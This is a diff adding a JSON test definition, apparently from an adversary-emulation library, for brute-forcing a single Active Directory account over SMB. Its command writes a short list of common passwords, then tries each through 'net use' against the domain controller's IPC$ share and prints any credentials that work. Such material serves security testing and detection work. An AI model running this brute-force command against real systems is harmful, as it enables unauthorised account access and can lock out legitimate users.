@@ -1,0 +1,29 @@
+{
+    "name": "Brute Force Credentials of single Active Directory domain users via SMB",
+    "description": "Attempts to brute force a single Active Directory account by testing connectivity to the IPC$ share on a domain controller ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "name": "command_prompt",
+        "command": "echo Password1> passwords.txt\necho 1q2w3e4r>> passwords.txt\necho Password!>> passwords.txt\necho Spring2022>> passwords.txt\necho ChangeMe!>> passwords.txt\n@FOR /F \"delims=\" %p in (passwords.txt) DO @net use %logonserver%\\IPC$ /user:\"%userdomain%\\#{user}\" \"%p\" 1>NUL 2>&1 && @echo [*] #{user}:%p && @net use /delete %logonserver%\\IPC$ > NUL\n",
+        "type": "Command Executor"
+    },
+    "id": "T1110.001",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "Password Guessing",
+    "source": "ART",
+    "uuid": "09480053-2f98-4854-be6e-71ae5f672224",
+    "arguments": {
+        "user": {
+            "description": "Account to bruteforce",
+            "type": "string",
+            "default": "%username%"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
